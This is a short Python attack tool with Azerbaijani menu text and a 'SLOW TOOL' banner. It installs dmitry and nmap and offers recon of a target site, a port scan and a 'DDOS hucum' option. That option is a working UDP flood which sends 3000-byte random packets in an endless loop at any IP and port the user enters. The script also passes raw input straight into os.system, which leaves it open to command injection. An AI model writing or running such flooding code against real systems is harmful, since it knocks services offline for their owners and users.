import os
import socket
import random
os.system("apt install dmitry")
os.system("apt install nmap")
os.system("clear")

print('''

        /$$$$$$        /$$              /$$$$$$        /$$      /$$                 /$$$$$$$$        /$$$$$$         /$$$$$$        /$$      
       /$$__  $$      | $$             /$$__  $$      | $$  /$ | $$                |__  $$__/       /$$__  $$       /$$__  $$      | $$      
      | $$  \__/      | $$            | $$  \ $$      | $$ /$$$| $$                   | $$         | $$  \ $$      | $$  \ $$      | $$      
      |  $$$$$$       | $$            | $$  | $$      | $$/$$ $$ $$                   | $$         | $$  | $$      | $$  | $$      | $$      
       \____  $$      | $$            | $$  | $$      | $$$$_  $$$$                   | $$         | $$  | $$      | $$  | $$      | $$      
       /$$  \ $$      | $$            | $$  | $$      | $$$/ \  $$$                   | $$         | $$  | $$      | $$  | $$      | $$      
      |  $$$$$$/      | $$$$$$$$      |  $$$$$$/      | $$/   \  $$                   | $$         |  $$$$$$/      |  $$$$$$/      | $$$$$$$$
       \______/       |________/       \______/       |__/     \__/                   |__/          \______/        \______/       |________/
                                                                                                                                                                                                             
                                                                                                                                                                                                             
1.Hedef site haqqinda
2.port scanner
3.DDOS hucum                                                                                                                                                                                                            

''')

secim = input('Nov sec:')
if(secim == '1'):
    hedefsite = input('Hedef site adresi')
    os.system('dmitry ' + hedefsite)
elif(secim == '2'):
    hedef = input('Sayt adresi ve ya ip daxit et:')
    os.system('nmap ' + hedef)
elif(secim == '3'):
    print("""
    ###########################
    #  T00L - By SLOWBITH     #
    #  ATTACK- DDOS           #
    #  HUCUMA HAZIRDIR        #
    ###########################
    """)
    hedef_ip=input("Hedef ip daxil et :")
    hedef_port=int(input("Hedef port:"))

    bytes = random._urandom(3000)
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sayac = 0
    while True:
        sock.sendto(bytes , (hedef_ip,hedef_port))
        sayac=sayac+1
        print("HUCUM EDILIR , gonderilen byte:%s"%(sayac))
        
